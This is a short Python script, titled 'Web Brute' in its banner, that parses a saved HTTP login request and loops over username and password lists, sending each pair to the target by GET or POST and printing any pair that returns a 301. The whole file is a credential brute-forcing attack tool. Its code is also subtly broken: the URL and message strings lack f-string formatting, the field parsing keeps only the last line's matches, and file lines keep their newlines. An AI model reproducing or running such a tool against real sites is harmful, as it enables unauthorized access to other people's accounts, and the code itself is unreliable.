import requests
import sys
import pyfiglet
import re

request = []
users = []
passwords = []

def getRequest():
    
    #parse request content for host info
    hostLine = request[1].split(": ")
    host = hostLine[1]

    #parse request content for path to resource
    resourceLine = request[0].split(" ")
    resource = resourceLine[1]
    reqType = resourceLine[0]
    path = resource.split("?")
    if len(path) > 1:
        path = path[0]
    

    #determine req type and grab appropriate args
    for line in request:
        fields = re.findall("^[upUP][a-z]+=$", line)
    
    return host, path, reqType, fields

def bruteForce(host, path, reqType, fields):
    if reqType == "GET":
        for user in users:
            for password in passwords:
                payload = {fields[0]: user, fields[1]: password}
                r = requests.get('https://{host}/{path}', params=payload)
                if r.status_code == 301:
                    print("{user}:{password} successful!")
    elif reqType == "POST":
        for user in users:
            for password in passwords:
                payload = {fields[0]: user, fields[1]: password}
                r = requests.post('https://{host}/{path}', params=payload)
                if r.status_code == 301:
                    print("{user}:{password} successful!")
    else:
        print("Unknown request type")
        exit()

ascii_banner = pyfiglet.figlet_format("Web Brute")
print(ascii_banner)

if len(sys.argv) == 4:
    file = sys.argv[1]
    userList = sys.argv[2]
    passList = sys.argv[3]
else:
    print("Usage: web-brute.py $requestFile $userFile $passwordFile")
    exit()
#read in request content
f = open(file, 'r')
for line in f:
    request.append(line)
f.close()

    #read in user and pass info
g = open(userList, 'r')
for line in g:
    users.append(line)
g.close()

h = open(passList, 'r')
for line in h:
    passwords.append(line)
h.close()

host, path, reqType, fields = getRequest()

bruteForce(host,path,reqType,fields)